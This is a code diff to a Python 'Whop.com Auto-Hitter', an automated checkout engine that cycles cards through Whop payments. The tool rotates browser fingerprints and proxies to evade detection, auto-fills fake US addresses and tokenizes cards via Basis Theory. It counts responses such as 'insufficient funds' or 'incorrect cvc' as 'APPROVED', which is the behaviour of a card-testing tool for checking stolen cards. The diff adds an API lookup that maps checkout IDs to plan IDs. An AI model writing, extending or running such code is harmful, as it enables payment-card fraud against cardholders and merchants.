@@ -2,10 +2,12 @@
 """
 Whop.com Auto-Hitter (curl_cffi Edition with Full Fingerprint Rotation)
 Automated checkout & charge engine for Whop.com membership & product pages.
+
 Features:
 - curl_cffi AsyncSession with real browser TLS fingerprint emulation (impersonate="chrome131", "chrome133")
 - Full realistic device profile rotation (User-Agent, sec-ch-ua, screen dimensions, WebGL vendor/renderer, timezones)
 - Next.js RSC & structured JSON product plan resolution (avoiding $0.00 free tiers)
+- Checkout configuration (ch_...) resolution via the public Whop API
 - Custom-field auto-fill (prevents "Custom field response not included in array" errors)
 - Containerized Basis Theory card tokenization with Whop merchant container exchange
 - Strict charge classification (zero false positives, real gateway decline extraction)
@@ -164,6 +166,7 @@ REAL_US_ADDRESSES = [
     {"line1": "3601 C St", "city": "Anchorage", "state": "AK", "postalCode": "99503"},
 ]
 
+
 def format_proxy(raw: Optional[str]) -> Optional[str]:
     if not raw:
         return None
@@ -180,6 +183,76 @@ def format_proxy(raw: Optional[str]) -> Optional[str]:
         host, port = parts
         return f"http://{host}:{port}"
     return f"http://{raw}"
+
+
+# ═══════════════════════════════════════════════════════════════
+# CHECKOUT CONFIG RESOLVER (ch_... → plan_...)
+# ═══════════════════════════════════════════════════════════════
+
+async def _resolve_checkout_config_to_plan(
+    client: AsyncSession,
+    checkout_config_id: str,
+    headers: Dict[str, str],
+) -> Optional[str]:
+    """
+    Given a `ch_...` checkout configuration ID, call the public Whop API
+    to retrieve the underlying `plan_...` ID.
+
+    Endpoint: GET https://api.whop.com/api/v1/checkout_configurations/{id}
+    This endpoint is public (no auth) so checkout pages can load.
+
+    Returns None on failure.
+    """
+    if not checkout_config_id or not checkout_config_id.startswith("ch_"):
+        return None
+
+    try:
+        api_headers = {
+            "user-agent": headers.get("user-agent", "Mozilla/5.0"),
+            "accept": "application/json",
+            "origin": "https://whop.com",
+            "referer": "https://whop.com/",
+        }
+        r = await client.get(
+            f"https://api.whop.com/api/v1/checkout_configurations/{checkout_config_id}",
+            headers=api_headers,
+            timeout=15,
+        )
+        if r.status_code == 200:
+            try:
+                data = r.json()
+            except Exception:
+                logger.warning(f"[whop_hitter] non-JSON response from checkout_configurations API for {checkout_config_id}")
+                return None
+
+            # Primary shape: {"plan": {"id": "plan_..."}}
+            plan = data.get("plan") or {}
+            pid = plan.get("id") if isinstance(plan, dict) else None
+
+            # Fallback shapes sometimes seen
+            if not pid:
+                pid = data.get("plan_id") or data.get("planId")
+            if not pid and isinstance(data.get("plan"), str):
+                pid = data["plan"]
+
+            if pid and isinstance(pid, str) and pid.startswith("plan_"):
+                logger.info(f"[whop_hitter] resolved {checkout_config_id} -> {pid}")
+                return pid
+
+            logger.warning(
+                f"[whop_hitter] checkout_configurations response for {checkout_config_id} "
+                f"did not include a usable plan_ id (keys: {list(data.keys())})"
+            )
+            return None
+
+        logger.warning(
+            f"[whop_hitter] checkout_configurations API returned HTTP {r.status_code} "
+            f"for {checkout_config_id}: {r.text[:120]}"
+        )
+    except Exception as e:
+        logger.warning(f"[whop_hitter] failed to resolve checkout config {checkout_config_id}: {e}")
+
+    return None
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -385,10 +458,29 @@ class WhopHitter:
         async with AsyncSession(impersonate=impersonate_target, proxy=self.proxy, verify=False, timeout=30) as client:
             plan_id = None
             page_html = ""   # hoisted so it's always defined
+
+            # ─────────────────────────────────────────────────────────
+            # PRIORITY 1 — plan_ ID directly in URL
+            # ─────────────────────────────────────────────────────────
             url_plans = re.findall(r'\bplan_[a-zA-Z0-9]{12,18}\b', url)
             if url_plans:
                 plan_id = url_plans[0]
 
+            # ─────────────────────────────────────────────────────────
+            # PRIORITY 2 — ch_ checkout configuration → resolve via API
+            # ─────────────────────────────────────────────────────────
+            if not plan_id:
+                ch_match = re.search(r'\bch_[a-zA-Z0-9]{12,20}\b', url)
+                if ch_match:
+                    resolved = await _resolve_checkout_config_to_plan(
+                        client, ch_match.group(0), headers_common
+                    )
+                    if resolved:
+                        plan_id = resolved
+
+            # ─────────────────────────────────────────────────────────
+            # PRIORITY 3 — scrape the product page HTML / RSC
+            # ─────────────────────────────────────────────────────────
             if not plan_id:
                 try:
                     r_page = await client.get(url, headers={"user-agent": profile["ua"]})
@@ -432,7 +524,14 @@ class WhopHitter:
                         if html_plans:
                             plan_id = html_plans[0]
                         else:
-                            r_rsc = await client.get(url, headers={"user-agent": profile["ua"], "RSC": "1", "accept": "text/x-component"})
+                            r_rsc = await client.get(
+                                url,
+                                headers={
+                                    "user-agent": profile["ua"],
+                                    "RSC": "1",
+                                    "accept": "text/x-component",
+                                },
+                            )
                             rsc_plans = re.findall(r'\bplan_[a-zA-Z0-9]{12,18}\b', r_rsc.text)
                             if rsc_plans:
                                 plan_id = rsc_plans[0]
@@ -462,7 +561,7 @@ class WhopHitter:
             prod_slug = parsed_url.path.strip("/").split("/")[0] if parsed_url.path.strip("/") else ""
 
             # ─────────────────────────────────────────────────────────
-            # AUTO-FILL CUSTOM FIELDS (Option A fix)
+            # AUTO-FILL CUSTOM FIELDS
             # Prevents the "Custom field response not included in array"
             # error by injecting `custom_field_responses` when the plan
             # declares any custom fields.
@@ -489,8 +588,8 @@ class WhopHitter:
                     )
             else:
                 # Always send an empty array so Whop has the key present.
-                # This is harmless for plans without custom fields and
-                # satisfies endpoints that require the key to exist.
+                # Harmless for plans without custom fields; satisfies
+                # endpoints that require the key to exist.
                 checkout_payload["custom_field_responses"] = []
 
             if affiliate_code:
@@ -573,7 +672,11 @@ class WhopHitter:
 
             try:
                 # 1. Create BT session
-                r_bts = await client.post("https://js.basistheory.com/api/sessions", headers=bt_headers, json={"deviceInfo": device_info})
+                r_bts = await client.post(
+                    "https://js.basistheory.com/api/sessions",
+                    headers=bt_headers,
+                    json={"deviceInfo": device_info},
+                )
                 bts_data = r_bts.json() if r_bts.status_code in (200, 201) else {}
                 session_key = bts_data.get("session_key")
                 nonce = bts_data.get("nonce")
@@ -630,7 +733,11 @@ class WhopHitter:
                     }
 
                 # 4. Patch expiration and CVC
-                patch_headers = {**bt_headers, "bt-api-key": str(session_key), "content-type": "application/merge-patch+json"}
+                patch_headers = {
+                    **bt_headers,
+                    "bt-api-key": str(session_key),
+                    "content-type": "application/merge-patch+json",
+                }
                 await client.patch(
                     f"https://js.basistheory.com/api/tokens/{bt_token}",
                     headers=patch_headers,
@@ -745,7 +852,9 @@ class WhopHitter:
             if last_err:
                 err_msg = last_err.get("message") or last_err.get("code") or "Payment Confirmation Failed"
                 err_lower = err_msg.lower()
-                is_approved = any(k in err_lower for k in ["insufficient funds", "incorrect cvc", "security code", "3d", "authenticate", "zip code"])
+                is_approved = any(k in err_lower for k in [
+                    "insufficient funds", "incorrect cvc", "security code", "3d", "authenticate", "zip code"
+                ])
                 return {
                     "Response": err_msg,
                     "Status": "APPROVED" if is_approved else "DECLINED",
